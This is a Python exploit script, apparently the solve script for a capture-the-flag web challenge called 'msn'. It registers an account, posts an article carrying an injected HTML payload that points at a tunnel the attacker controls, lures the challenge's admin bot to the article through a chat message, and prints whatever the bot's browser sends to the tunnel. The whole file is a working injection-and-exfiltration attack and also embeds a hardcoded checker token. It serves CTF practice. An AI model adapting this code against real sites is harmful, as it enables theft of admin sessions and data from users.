import os
import random
import string
import urllib.parse
from time import sleep

import requests
import socketio
import tunnel
from bs4 import BeautifulSoup

CHECKER_TOKEN = "77dbca0385e54dcbbf6a746bad9f2af4f0c1445f7325476b82737d1b7c939143"

CHAT_URL = os.environ.get("URL", "http://chat.msn.challs.teamitaly.eu")
if CHAT_URL.endswith("/"):
    CHAT_URL = CHAT_URL[:-1]

SPACES_URL = CHAT_URL.replace('chat.msn.', 'spaces.msn.')


def randstr(length):
    return ''.join(random.choice(string.ascii_uppercase) for _ in range(length))


def getArticleRef(url):
    parts = url.strip("/").split("/")
    return f"{parts[-2]}/{parts[-1]}"


s = requests.Session()

s.post(f"{CHAT_URL}/api/v1/users", json={
    "username": randstr(16),
    "password": randstr(16),
    "propic": "tofu.png"
})

MY_ID = s.get(f"{CHAT_URL}/api/v1/session").json()["id"]
ADMIN_ID = s.get(f"{CHAT_URL}/chat/").url.strip("/").split("/")[-1]

# need to open this outside of the sio context
with tunnel.open_http_tunnel() as t:
    sio = socketio.Client(http_session=s)
    sio.connect(CHAT_URL)


    @sio.on("message")
    def continueXploit(data):
        for message in data["messages"]:
            if message["sender"] != ADMIN_ID:
                continue

            welcomeRef = message["content"]
            welcome = s.get(f"{SPACES_URL}/articles/{welcomeRef}")

            bs = BeautifulSoup(welcome.text, features="lxml")
            a_elem = bs.find("a", string="Tofu's article")
            if not a_elem:
                continue

            TOFU_ID = getArticleRef(a_elem["href"]).split("/")[0]

            r = s.post(f"{SPACES_URL}/articles/{MY_ID}", data={
                "title": randstr(8),
                "content": open(os.path.join(os.path.dirname(__file__), "poc.min.html"), "r").read() % (
                    f'http://{t.remote_host}:{t.remote_port}', CHAT_URL, TOFU_ID)
            })
            injectedRef = getArticleRef(r.url)

            sio.emit("message", (1, injectedRef))
            sleep(1)
            sio.emit("nudge", CHECKER_TOKEN)
            sleep(1)

            _, path, _, _ = t.wait_request()
            print(urllib.parse.unquote(path))
            t.send_response(200, {}, b'')

            sio.disconnect()


    sio.emit("join", ADMIN_ID)
    sio.wait()
